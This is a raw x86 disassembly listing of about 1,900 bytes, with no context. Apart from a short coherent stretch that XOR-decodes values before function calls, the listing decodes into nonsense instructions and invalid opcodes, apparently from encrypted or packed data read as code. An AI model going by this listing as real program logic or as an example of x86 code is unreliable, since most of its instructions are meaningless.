  408170:	adc    bl,0x19
  408173:	test   DWORD PTR [ebp+ebp*1+0x16d257bb],eax
  40817a:	into   
  40817b:	stc    
  40817c:	pop    ecx
  40817d:	out    0x61,eax
  40817f:	adc    ebp,ebp
  408181:	jg     0x408143
  408183:	sti    
  408184:	sub    al,0x57
  408186:	xor    eax,0xfffb2b95
  40818b:	sbb    bh,ah
  40818d:	or     eax,0xc53f85b8
  408192:	cdq    
  408193:	xchg   BYTE PTR [ebx+0x590eb5eb],dl
  408199:	test   al,0xa
  40819b:	xchg   esi,eax
  40819c:	aad    0xd8
  40819e:	inc    eax
  40819f:	xchg   ecx,eax
  4081a0:	mov    al,0x2f
  4081a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081a3:	inc    ebp
  4081a4:	ficom  WORD PTR [edi]
  4081a6:	ins    DWORD PTR es:[edi],dx
  4081a7:	call   0x5a46:0x3eabdf48
  4081ae:	mov    eax,ds:0xdd3c2aad
  4081b3:	mov    bh,0x4c
  4081b5:	mov    ah,0xb4
  4081b7:	shr    DWORD PTR [edx],cl
  4081b9:	call   ebx
  4081bb:	mov    edi,0xabc63dab
  4081c0:	or     BYTE PTR ds:0x8fc0163a,0xbb
  4081c7:	and    eax,0x82d6d175
  4081cc:	xchg   esi,eax
  4081cd:	push   es
  4081ce:	loope  0x4081ff
  4081d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081d1:	outs   dx,BYTE PTR ds:[esi]
  4081d2:	imul   DWORD PTR ds:0x8904458d
  4081d8:	inc    ebp
  4081d9:	loopne 0x4081ea
  4081db:	test   BYTE PTR [esp+edx*1+0x458d0000],cl
  4081e2:	call   0xd4860d37
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	ret    
  408269:	loop   0x40823e
  40826b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40826c:	aaa    
  40826d:	shl    BYTE PTR [eax+0x70],cl
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x40824e
  408275:	cmp    al,0x8a
  408277:	jp     0x408221
  408279:	cmp    DWORD PTR ds:0x19376ba9,ecx
  40827f:	rcl    DWORD PTR [ebx+esi*1-0x6cac235f],cl
  408286:	in     al,dx
  408287:	data16 jg 0x408280
  40828a:	lods   eax,DWORD PTR ds:[esi]
  40828b:	xchg   esp,eax
  40828c:	daa    
  40828d:	mov    ecx,0x333921f
  408292:	shr    BYTE PTR [eax],cl
  408294:	pop    ds
  408295:	lods   al,BYTE PTR ds:[esi]
  408296:	clc    
  408297:	sub    ebx,ebp
  408299:	in     al,dx
  40829a:	loope  0x4082c3
  40829c:	test   al,0xca
  40829e:	faddp  st(5),st
  4082a0:	dec    esi
  4082a1:	fs popa 
  4082a3:	popa   
  4082a4:	ror    DWORD PTR [esi],1
  4082a6:	arpl   WORD PTR [ebx+0x1b],bx
  4082a9:	push   es
  4082aa:	dec    edi
  4082ab:	repnz int3 
  4082ad:	mov    edx,0xa0d349ba
  4082b2:	repnz inc ebx
  4082b5:	pusha  
  4082b6:	fwait
  4082b7:	jecxz  0x408333
  4082b9:	loope  0x4082ee
  4082bb:	fucom  st(5)
  4082bd:	push   ds
  4082be:	dec    ebx
  4082bf:	retf   
  4082c0:	xor    esp,eax
  4082c2:	push   edi
  4082c3:	mov    dh,0xc6
  4082c5:	lahf   
  4082c6:	pop    ss
  4082c7:	lahf   
  4082c8:	rol    BYTE PTR [edi+0x5d8a5208],1
  4082ce:	xchg   edi,edx
  4082d0:	call   0xd778ab08
  4082d5:	lahf   
  4082d6:	adc    ch,BYTE PTR fs:[ecx-0x5c4acf97]
  4082dd:	xchg   ebp,eax
  4082de:	mov    bh,0x1c
  4082e0:	fwait
  4082e1:	sub    eax,DWORD PTR [ebx-0x6a]
  4082e4:	push   edi
  4082e5:	test   al,0x64
  4082e7:	scas   eax,DWORD PTR es:[edi]
  4082e8:	adc    esi,edi
  4082ea:	call   0xa4b6:0x875fedc
  4082f1:	jmp    0xa139a463
  4082f6:	add    ah,BYTE PTR [edx+eiz*8-0x3faf06eb]
  4082fd:	shr    BYTE PTR [ebx+0x20],1
  408300:	jp     0x40837f
  408302:	mov    bh,0xb4
  408304:	imul   eax,ebp,0x6c
  408307:	pop    ebx
  408308:	clc    
  408309:	pushf  
  40830a:	add    al,0xf7
  40830c:	fld    DWORD PTR [eax-0x70]
  40830f:	test   eax,0xa684a018
  408314:	sbb    dl,ch
  408316:	jecxz  0x40830c
  408318:	inc    edi
  408319:	imul   esp,DWORD PTR ds:0x87f4c1e,0x2f95b48
  408323:	cmp    DWORD PTR [ecx+0x32],eax
  408326:	mov    edx,0x72ce6ab
  40832b:	add    ebp,DWORD PTR ds:0x362a4562
  408331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408332:	mov    cl,0xe0
  408334:	ds aaa 
  408336:	jge    0x408304
  408338:	scas   eax,DWORD PTR es:[edi]
  408339:	call   0x60ae7b9d
  40833e:	fidiv  WORD PTR [eax]
  408340:	into   
  408341:	sub    ebx,ebp
  408343:	cmp    edx,ecx
  408345:	fadd   DWORD PTR [ecx-0x7b]
  408348:	bound  edi,QWORD PTR [eax-0x286cf8db]
  40834e:	inc    esi
  40834f:	dec    ecx
  408350:	or     dh,BYTE PTR [eax]
  408352:	push   ss
  408353:	xor    DWORD PTR [ebx-0x33],eax
  408356:	mul    BYTE PTR [ebp+0x3c23e26d]
  40835c:	jge    0x4082e6
  40835e:	cmp    edi,DWORD PTR ds:0x98af2620
  408364:	fwait
  408365:	or     eax,0xa1f53b93
  40836a:	dec    eax
  40836b:	or     dl,al
  40836d:	stc    
  40836e:	pop    edx
  40836f:	hlt    
  408370:	test   BYTE PTR [edi-0x1925a0ec],bl
  408376:	imul   esi,DWORD PTR [edx+edi*8],0xda904f6b
  40837d:	xchg   ebp,eax
  40837e:	sub    edi,DWORD PTR [ebx-0x338c28c9]
  408384:	fild   DWORD PTR [edx]
  408386:	mov    WORD PTR [edx],?
  408388:	das    
  408389:	pusha  
  40838a:	shr    DWORD PTR fs:[eax],0xdc
  40838e:	mov    eax,0x2c74b00a
  408393:	std    
  408394:	in     al,0x6e
  408396:	ds aas 
  408398:	in     al,dx
  408399:	xor    DWORD PTR [esi+ecx*1+0x2b00ee20],esp
  4083a0:	sahf   
  4083a1:	mov    cl,0x87
  4083a3:	xchg   ecx,eax
  4083a4:	mov    al,0x24
  4083a6:	test   eax,0xf64dd423
  4083ab:	lods   al,BYTE PTR ds:[esi]
  4083ac:	jae    0x408363
  4083ae:	inc    edx
  4083af:	push   ecx
  4083b0:	jb     0x40834a
  4083b2:	and    DWORD PTR [ebp-0x47bd11b],0x7f
  4083b9:	inc    ebp
  4083ba:	mov    ch,0xf5
  4083bc:	or     bh,ch
  4083be:	loope  0x40842b
  4083c0:	inc    edi
  4083c1:	repz cld 
  4083c3:	jb     0x408444
  4083c5:	inc    edi
  4083c6:	rol    BYTE PTR [ecx],0xa0
  4083c9:	sub    bl,BYTE PTR [eax+0x301b68c5]
  4083cf:	adc    ecx,ecx
  4083d1:	inc    ecx
  4083d2:	mov    ch,BYTE PTR [ebx+0x39]
  4083d5:	xchg   esp,eax
  4083d6:	cmp    esp,esi
  4083d8:	mov    DWORD PTR [eax-0x758f6c92],ebp
  4083de:	cwde   
  4083df:	fistp  QWORD PTR [ebx]
  4083e1:	fst    DWORD PTR [edi+esi*2+0x47]
  4083e5:	mov    dh,0x79
  4083e7:	iret   
  4083e8:	test   al,0x37
  4083ea:	push   cs
  4083eb:	push   edi
  4083ec:	mov    esp,0xd6ccf21c
  4083f1:	xchg   ebp,eax
  4083f2:	es pop ecx
  4083f4:	pop    eax
  4083f5:	(bad)  
  4083f6:	ror    BYTE PTR [edi],1
  4083f8:	cwde   
  4083f9:	mov    ah,bl
  4083fb:	xor    ebx,DWORD PTR [esi+0x38]
  4083fe:	inc    edi
  4083ff:	es gs adc dl,cl
  408403:	pop    eax
  408404:	mov    ch,0x6e
  408406:	rol    BYTE PTR [edi+0x7],cl
  408409:	fcmovne st,st(5)
  40840b:	jmp    0x408396
  40840d:	imul   edx,DWORD PTR [edi-0x35],0x4d0e6eaa
  408414:	hlt    
  408415:	aam    0xe9
  408417:	mov    esp,0x537eb066
  40841c:	(bad)  
  40841d:	push   0x73178f59
  408422:	js     0x408434
  408424:	div    bl
  408426:	das    
  408427:	int3   
  408428:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408429:	or     bh,BYTE PTR [eax-0x7f]
  40842c:	div    edx
  40842e:	fnstsw WORD PTR [ecx]
  408430:	bound  esi,QWORD PTR [esi]
  408432:	loope  0x4084a5
  408434:	cmc    
  408435:	mov    ch,BYTE PTR es:[edx-0x2af6acde]
  40843c:	xor    al,0x68
  40843e:	fisttp WORD PTR [edi]
  408440:	imul   eax,DWORD PTR [edi],0xa605870d
  408446:	pop    ecx
  408447:	inc    ebx
  408448:	rcr    DWORD PTR [edx],1
  40844a:	inc    eax
  40844b:	pop    ds
  40844c:	outs   dx,DWORD PTR ds:[esi]
  40844d:	mov    esi,0x40c6c86b
  408452:	sub    eax,0x866e2f6d
  408457:	push   0x3b
  408459:	popf   
  40845a:	push   ds
  40845b:	fst    QWORD PTR [ebp+0x444871d3]
  408461:	pop    ecx
  408462:	jns    0x408467
  408464:	ds out dx,al
  408466:	jns    0x408454
  408468:	add    al,0xb2
  40846a:	pop    ebp
  40846b:	sbb    eax,0xf658e43
  408470:	sub    esp,0xffffffa8
  408473:	pop    ds
  408474:	ror    BYTE PTR [ebp+0x54],cl
  408477:	aas    
  408478:	fwait
  408479:	in     al,0xb
  40847b:	fsubrp st(3),st
  40847d:	or     bl,dl
  40847f:	mov    edx,0x5c398f
  408484:	sbb    eax,eax
  408486:	popf   
  408487:	div    BYTE PTR ds:0x4a42f504
  40848d:	stos   BYTE PTR es:[edi],al
  40848e:	je     0x4084e3
  408490:	jge    0x408489
  408492:	lods   al,BYTE PTR ds:[esi]
  408493:	aaa    
  408494:	pop    edx
  408495:	(bad)  
  408496:	mov    ecx,0x93e109a1
  40849b:	test   BYTE PTR [eax-0x2b85b709],bh
  4084a1:	fdivrp st(2),st
  4084a3:	scas   al,BYTE PTR es:[edi]
  4084a4:	dec    ebp
  4084a5:	and    esp,esi
  4084a7:	cld    
  4084a8:	xor    BYTE PTR [esi+0x6b],dh
  4084ab:	lea    ebp,[ecx]
  4084ad:	iret   
  4084ae:	fsubr  DWORD PTR [edx]
  4084b0:	mov    ebp,0x960e7024
  4084b5:	add    DWORD PTR [eax+0x46],0x6350cc5f
  4084bc:	xchg   ebx,edx
  4084be:	enter  0xf3e5,0x62
  4084c2:	dec    ebx
  4084c3:	(bad)  
  4084c4:	stc    
  4084c5:	pushf  
  4084c6:	aad    0x14
  4084c8:	(bad)  
  4084ca:	call   0x310b:0x3fb2295d
  4084d1:	jbe    0x408470
  4084d3:	ds mov dh,0x52
  4084d6:	aam    0xbf
  4084d8:	std    
  4084d9:	pop    eax
  4084da:	cmp    DWORD PTR [ecx-0x397798f6],esi
  4084e0:	cdq    
  4084e1:	adc    dh,BYTE PTR [eax]
  4084e3:	push   cs
  4084e4:	pop    es
  4084e5:	cdq    
  4084e6:	outs   dx,DWORD PTR ds:[esi]
  4084e7:	sbb    bh,bh
  4084e9:	and    eax,0xda6b7dd3
  4084ee:	or     BYTE PTR [esi],ch
  4084f0:	aad    0xac
  4084f2:	int3   
  4084f3:	les    ebp,FWORD PTR [ecx+0x3a06d660]
  4084f9:	lods   al,BYTE PTR ds:[esi]
  4084fa:	psubq  mm5,QWORD PTR [ebp-0x7b]
  4084fe:	or     BYTE PTR [edi+0x23],dh
  408501:	lock or ch,bl
  408504:	sar    DWORD PTR [esi-0x485904f0],1
  40850a:	adc    BYTE PTR [edx+0x3ab1b79d],0x19
  408511:	imul   BYTE PTR [bp+si]
  408514:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408515:	arpl   sp,ax
  408517:	idiv   BYTE PTR [esi+edi*4-0xf]
  40851b:	cmp    eax,0x62ead471
  408520:	jae    0x40852d
  408522:	in     eax,0xd7
  408524:	mov    ebx,0x7aae4a19
  408529:	xchg   ecx,eax
  40852a:	addr16 mov al,ds:0x7c44
  40852e:	add    BYTE PTR [ebx],dl
  408530:	jg     0x408539
  408532:	add    ebp,0x2c
  408535:	hlt    
  408536:	mov    ds:0x6aafe8e8,eax
  40853b:	fnstsw WORD PTR [edi+0x7688962b]
  408541:	jg     0x408543
  408543:	or     eax,0xdfbc570b
  408548:	jbe    0x4085b5
  40854a:	inc    ebx
  40854b:	cmp    al,0x4e
  40854d:	repnz xor ah,BYTE PTR [eax-0x13]
  408551:	or     DWORD PTR [ebx-0x7ad8d825],edi
  408557:	jecxz  0x4085c7
  408559:	inc    edx
  40855a:	test   BYTE PTR [ebx+0x67],al
  40855d:	sbb    eax,DWORD PTR ds:0xfcb44c95
  408563:	mov    ch,0x51
  408565:	mov    ds:0xfa8144ce,eax
  40856a:	and    cl,dl
  40856c:	push   esi
  40856d:	and    DWORD PTR [esi-0x7c347d88],esp
  408573:	xor    eax,0x60e11c09
  408578:	sbb    BYTE PTR [edi+0x46],bh
  40857b:	cwde   
  40857c:	sbb    BYTE PTR [eax],0x89
  40857f:	into   
  408580:	mov    ds:0x98a48da,al
  408585:	shl    BYTE PTR [edi+ebp*4],1
  408588:	cmp    BYTE PTR [ecx-0x16b9a5c2],bl
  40858e:	daa    
  40858f:	mov    eax,ds:0x99c26486
  408594:	lock pop eax
  408596:	int3   
  408597:	xor    al,0xf3
  408599:	mov    BYTE PTR [ebp+0x7],al
  40859c:	popf   
  40859d:	jns    0x408563
  40859f:	add    al,0xe1
  4085a1:	mov    ss:0xe90188ff,al
  4085a7:	dec    eax
  4085a8:	add    eax,DWORD PTR [eax]
  4085aa:	add    BYTE PTR [edi-0x6],al
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0xf548413f
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x40855c
  4085c4:	add    bl,ch
  4085c6:	pop    edi
  4085c7:	jnp    0x4085f9
  4085c9:	push   eax
  4085ca:	(bad)  
  4085cb:	je     0x4085e4
  4085cd:	sub    BYTE PTR [edx-0x5],0x20
  4085d1:	sar    DWORD PTR [eax-0x7d],0xa
  4085d5:	bound  edi,QWORD PTR [edi]
  4085d7:	hlt    
  4085d8:	dec    edi
  4085d9:	adc    ch,BYTE PTR [edx]
  4085db:	clc    
  4085dc:	cmc    
  4085dd:	or     cl,BYTE PTR [edx-0x5d04f071]
  4085e3:	mov    eax,0xe68c040d
  4085e8:	cmp    esp,DWORD PTR [eax]
  4085ea:	les    ecx,FWORD PTR [ecx]
  4085ec:	jbe    0x4085f5
  4085ee:	push   es
  4085ef:	retf   
  4085f0:	xchg   edx,eax
  4085f1:	ja     0x408649
  4085f3:	push   eax
  4085f4:	mov    eax,ds:0x9853f7d2
  4085f9:	out    0x84,al
  4085fb:	add    al,0xdd
  4085fd:	cmc    
  4085fe:	fnclex 
  408600:	imul   ecx,DWORD PTR [eax-0x51976af3],0xbf24bbe5
  40860a:	adc    al,0xb5
  40860c:	push   es
  40860d:	jne    0x4085d1
  40860f:	jecxz  0x4085e9
  408611:	adc    eax,0x4d7ef017
  408616:	cs mov eax,0xc1db7665
  40861c:	push   0x44
  40861e:	inc    ebx
  40861f:	enter  0x52e6,0x95
  408623:	inc    ebx
  408624:	and    al,bh
  408626:	ja     0x40860b
  408628:	cmp    al,0x6b
  40862a:	outs   dx,DWORD PTR ds:[esi]
  40862b:	ss ss sbb al,0xaf
  40862f:	mov    dl,0x38
  408631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408632:	daa    
  408633:	pop    esp
  408634:	aad    0x2c
  408636:	lahf   
  408637:	iret   
  408638:	mov    edx,0xebba859e
  40863d:	sbb    DWORD PTR [esi+0x479dbea2],esi
  408643:	je     0x4085dd
  408645:	mov    ebp,DWORD PTR [ebp-0x71]
  408648:	popa   
  408649:	xlat   BYTE PTR ds:[ebx]
  40864a:	mov    ?,ebp
  40864c:	ja     0x4085dd
  40864e:	lods   eax,DWORD PTR ds:[esi]
  40864f:	sbb    BYTE PTR [edi+0x2a],dh
  408652:	ins    BYTE PTR es:[edi],dx
  408653:	mov    ?,WORD PTR [esi+0x60]
  408656:	jle    0x408621
  408658:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408659:	sbb    al,0x6a
  40865b:	dec    DWORD PTR [ebx+0x4b6a0e47]
  408661:	xchg   edx,eax
  408662:	fldcw  WORD PTR [esi-0x7d]
  408665:	cmp    al,0x0
  408667:	sub    BYTE PTR [eax-0x3b],bh
  40866a:	scas   eax,DWORD PTR es:[edi]
  40866b:	inc    eax
  40866c:	or     eax,0x1e77ca51
  408671:	(bad)  
  408672:	test   eax,0xe1f1fd16
  408677:	sub    edx,ecx
  408679:	cmp    ebp,DWORD PTR [ebx]
  40867b:	pop    DWORD PTR [edi]
  40867d:	push   ecx
  40867e:	popa   
  40867f:	or     al,0x8
  408681:	out    0xc8,al
  408683:	clc    
  408684:	ret    
  408685:	cmp    BYTE PTR [ebx+edi*2+0x7d],al
  408689:	fsubp  st(2),st
  40868b:	mov    edi,0x167a2391
  408690:	nop
  408691:	mov    ah,0x81
  408693:	pop    ebx
  408694:	sti    
  408695:	and    eax,DWORD PTR [esi+edx*1+0x763b6ebf]
  40869c:	sbb    ebx,esi
  40869e:	in     eax,dx
  40869f:	cli    
  4086a0:	iret   
  4086a1:	nop
  4086a2:	outs   dx,BYTE PTR ds:[esi]
  4086a3:	pop    eax
  4086a4:	hlt    
  4086a5:	outs   dx,DWORD PTR ds:[esi]
  4086a6:	mov    bh,0x34
  4086a8:	jo     0x408670
  4086aa:	xchg   esi,eax
  4086ab:	pop    esp
  4086ac:	mov    DWORD PTR [ebx+edx*4-0x3ee66564],esi
  4086b3:	push   ds
  4086b4:	pop    ebx
  4086b5:	sub    DWORD PTR [esi-0x12ffe926],edx
  4086bb:	pop    edi
  4086bc:	dec    edi
  4086bd:	imul   ebx,DWORD PTR [ecx-0x1d],0x6c
  4086c1:	sbb    al,ah
  4086c3:	add    eax,0x3259af9a
  4086c8:	push   edx
  4086c9:	(bad)  [edx-0x41]
  4086cc:	fidiv  WORD PTR [ecx]
  4086ce:	adc    DWORD PTR [esi+0x4820f63],edx
  4086d4:	jnp    0x40869f
  4086d6:	push   es
  4086d7:	popa   
  4086d8:	cmp    esp,DWORD PTR [edi+0x540299a5]
  4086de:	int3   
  4086df:	ret    
  4086e0:	das    
  4086e1:	xor    ah,dl
  4086e3:	test   DWORD PTR [ebx-0x1d],0x1591795f
  4086ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086eb:	xor    al,0x63
  4086ed:	and    DWORD PTR [esi],ebx
  4086ef:	or     DWORD PTR [ebp-0xb],ebp
  4086f2:	inc    esp
  4086f3:	dec    edi
  4086f4:	rol    DWORD PTR [eax+0x386dc7dc],cl
  4086fa:	fmul   QWORD PTR [edi]
  4086fc:	aas    
  4086fd:	hlt    
  4086fe:	jno    0x4086df
  408700:	je     0x4086b7
  408702:	adc    dh,dh
  408704:	push   0x0
  408706:	inc    ebp
  408707:	cdq    
  408708:	and    DWORD PTR [ebx-0x7],edx
  40870b:	shl    BYTE PTR [edi+ebx*2-0x19b8fd3b],0x6d
  408713:	addr16 dec ecx
  408715:	ret    
  408716:	clc    
  408717:	inc    eax
  408718:	cmp    ebp,edi
  40871a:	xchg   edx,eax
  40871b:	pop    ecx
  40871c:	lea    ebp,[ecx]
  40871e:	jbe    0x40870e
  408720:	jmp    0x888870aa
  408725:	inc    ecx
  408726:	jmp    0x1e9fafbd
  40872b:	mov    al,BYTE PTR [edx-0x5b]
  40872e:	je     0x408715
  408730:	and    dh,BYTE PTR [esi-0x143386b6]
  408736:	mov    ecx,0x6007ad3f
  40873b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40873c:	cmp    al,0x7a
  40873e:	or     DWORD PTR [esp+esi*1],ebx
  408741:	rcl    DWORD PTR [esi+0x2d],1
  408744:	nop
  408745:	sub    DWORD PTR ds:[ecx+0x22],eax
  408749:	dec    esi
  40874a:	aaa    
  40874b:	(bad)  
  40874c:	xor    eax,0x72c3fd3d
  408751:	add    BYTE PTR [edx+0x4d7e9130],cl
  408757:	push   0x14
  408759:	loope  0x4087b9
  40875b:	xor    bl,BYTE PTR [eax-0x26]
  40875e:	ficomp DWORD PTR [edx-0x32]
  408761:	ror    edx,cl
  408763:	sbb    al,0x55
  408765:	popf   
  408766:	and    ebx,edx
  408768:	lods   al,BYTE PTR ds:[esi]
  408769:	int    0xfc
  40876b:	xor    dl,dl
  40876d:	ja     0x40878e
  40876f:	shl    BYTE PTR [ebx-0x2a],1
  408772:	scas   eax,DWORD PTR es:[edi]
  408773:	adc    al,BYTE PTR [eax-0x5f]
  408776:	dec    edi
  408777:	sbb    al,0xaf
  408779:	fwait
  40877a:	cld    
  40877b:	lods   al,BYTE PTR ds:[esi]
  40877c:	jae    0x4087ec
  40877e:	mov    esp,0x677ca363
  408783:	xchg   DWORD PTR [edi+0x21edeff3],ecx
  408789:	ins    BYTE PTR es:[edi],dx
  40878a:	fwait
  40878b:	scas   eax,DWORD PTR es:[edi]
  40878c:	xchg   bl,ah
  40878e:	dec    edx
  40878f:	add    eax,0x7707bb1a
  408794:	jae    0x408762
  408796:	popf   
  408797:	ins    DWORD PTR es:[edi],dx
  408798:	sbb    BYTE PTR [edi],0x10
  40879b:	enter  0xd9d1,0xc6
  40879f:	(bad)  
  4087a0:	sub    al,0x23
  4087a2:	loop   0x40872b
  4087a4:	iret   
  4087a5:	jbe    0x4087da
  4087a7:	lods   al,BYTE PTR ds:[esi]
  4087a8:	xlat   BYTE PTR ds:[ebx]
  4087a9:	xor    eax,0xdd9a5a22
  4087ae:	test   esp,ebp
  4087b0:	xor    dl,BYTE PTR [edx-0x7b0dd70f]
  4087b6:	jne    0x408826
  4087b8:	data16 sub al,0x93
  4087bb:	leave  
  4087bc:	pop    ecx
  4087bd:	pop    esi
  4087be:	ja     0x4087c0
  4087c0:	js     0x4087c4
  4087c2:	aaa    
  4087c3:	lea    ebx,[edx+0x18]
  4087c6:	dec    ebp
  4087c7:	jb     0x408818
  4087c9:	dec    ebp
  4087ca:	inc    esi
  4087cb:	sbb    al,0x4e
  4087cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087ce:	enter  0x7f72,0x13
  4087d2:	iret   
  4087d3:	mov    ch,BYTE PTR [esi+0x1014dd8d]
  4087d9:	mov    al,0x34
  4087db:	ja     0x4087f3
  4087dd:	add    BYTE PTR [ecx+ecx*1-0xf],ah
  4087e1:	mov    ebp,DWORD PTR [esi+0x76760e64]
  4087e7:	dec    esi
  4087e8:	adc    esi,ebx
  4087ea:	mov    eax,0xd1715256
  4087ef:	pushf  
  4087f0:	sub    BYTE PTR [esi],ah
  4087f2:	or     eax,0x22108b5b
  4087f7:	mov    cl,0x60
  4087f9:	and    BYTE PTR [edx-0x31],dl
  4087fc:	jne    0x4087bf
  4087fe:	sub    ebx,DWORD PTR [ecx]
  408800:	push   cs
  408801:	adc    DWORD PTR ds:0x49cf4a24,ebp
  408807:	stc    
  408808:	jno    0x408854
  40880a:	ins    BYTE PTR es:[edi],dx
  40880b:	push   edi
  40880c:	int3   
  40880d:	popa   
  40880e:	and    BYTE PTR [eax+0xa94d9a1],bh
  408814:	xlat   BYTE PTR ds:[ebx]
  408815:	dec    edx
  408816:	cmp    ah,BYTE PTR [edi+0xf96ee0f]
  40881c:	jge    0x40889c
  40881e:	in     al,0x73
  408820:	cmp    al,0xd7
  408822:	pop    ds
  408823:	retf   
  408824:	je     0x40884e
  408826:	jb     0x408810
  408828:	cld    
  408829:	pop    es
  40882a:	and    eax,0xec440b15
  40882f:	or     al,0xed
  408831:	jns    0x40889f
  408833:	fadd   DWORD PTR [eax]
  408835:	xchg   esp,eax
  408836:	sub    edx,ebp
  408838:	sbb    DWORD PTR [ecx+0xd],esi
  40883b:	test   DWORD PTR [edx+eiz*4],ecx
  40883e:	ret    0xa4b1
  408841:	cmc    
  408842:	js     0x408852
  408844:	add    DWORD PTR [ecx-0x60c41567],ebx
  40884a:	(bad)  
  40884b:	stc    
  40884c:	ins    BYTE PTR es:[edi],dx
  40884d:	pusha  
  40884e:	or     dh,BYTE PTR [ecx-0x16]
  408851:	sbb    dh,BYTE PTR [eax]
  408853:	sahf   
  408854:	adc    al,0xc9
  408856:	loopne 0x40880a
  408858:	repz (bad) 
  40885a:	cmp    esi,ecx
  40885c:	and    DWORD PTR [ebx-0x15],eax
  40885f:	mov    esi,0xf44c7062
  408864:	add    DWORD PTR [ecx],ebx
  408866:	retf   
  408867:	arpl   WORD PTR [ebx+0x44363c20],bx
  40886d:	jl     0x408811
  40886f:	xchg   DWORD PTR [ebx],edi
  408871:	stos   BYTE PTR es:[edi],al
  408872:	sti    
  408873:	in     al,0x9
  408875:	xor    BYTE PTR [eax],ch
  408877:	or     DWORD PTR [edi],edi
  408879:	dec    ecx
  40887a:	mov    esi,0xd0d38acc
  40887f:	or     eax,0x5fcd656e
  408884:	iret   
  408885:	mov    ah,BYTE PTR [ebp-0x1ced23af]
  40888b:	mov    ecx,0x5a38570d
  408890:	xchg   esi,eax
  408891:	stos   BYTE PTR es:[edi],al
  408892:	es retf 0x819a
  408896:	lds    eax,FWORD PTR [ebp+esi*8+0x3b]
  40889a:	loope  0x408844
  40889c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40889d:	pop    ebx
  40889e:	or     eax,0xea069039
  4088a3:	loop   0x408834
  4088a5:	cmp    BYTE PTR [ebp-0x29],ah
  4088a8:	and    esp,DWORD PTR ds:0x513c6a7e
  4088ae:	std    
  4088af:	jns    0x4088d3
  4088b1:	or     ecx,edi
  4088b3:	scas   al,BYTE PTR es:[edi]
  4088b4:	rdpmc  
  4088b6:	jns    0x4088f7
  4088b8:	and    eax,0x941336cf
  4088bd:	(bad)  
  4088be:	push   cs
  4088bf:	sub    al,0xe9
  4088c1:	lahf   
  4088c2:	test   al,0xab
  4088c4:	js     0x408868
  4088c6:	mov    gs,WORD PTR [ebx+ecx*1-0x3b71c326]
  4088cd:	sub    al,0xdf
  4088cf:	sbb    dl,BYTE PTR [eax+0x4088060c]
  4088d5:	shr    BYTE PTR [edx],cl
  4088d7:	jae    0x4088f3
  4088d9:	adc    bl,al
  4088db:	lods   eax,DWORD PTR ds:[esi]
  4088dc:	ret    0x7e5
  4088df:	or     dh,0xaa
  4088e2:	rdpmc  
  4088e4:	cmp    al,BYTE PTR [ebx-0x2b329f64]
  4088ea:	out    0x9f,eax
  4088ec:	inc    ecx
  4088ed:	bnd js 0x4088d2
  4088f0:	call   0x45ce4184
  4088f5:	clc    
  4088f6:	inc    BYTE PTR [eax]
  4088f8:	inc    eax
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp-0x71bca301],cl
  40890c:	mov    BYTE PTR [eax+0x46],dh
  40890f:	xchg   edi,eax
  408910:	fdiv   QWORD PTR [eax+0x70]
  408913:	and    BYTE PTR [ebp+0x70],bh
  408916:	jo     0x40893c
  408918:	mov    dh,0x35
  40891a:	xor    ch,BYTE PTR [edi]
  40891c:	push   es
  40891d:	or     dl,bh
  40891f:	jp     0x4088b4
  408921:	scas   al,BYTE PTR es:[edi]
  408922:	cmovae ebx,DWORD PTR [edx*4+0x4e94ae16]
  40892a:	aas    
  40892b:	std    
  40892c:	push   ecx
  40892d:	aam    0x72
  40892f:	add    esp,ebx
  408931:	adc    ch,BYTE PTR [esi]
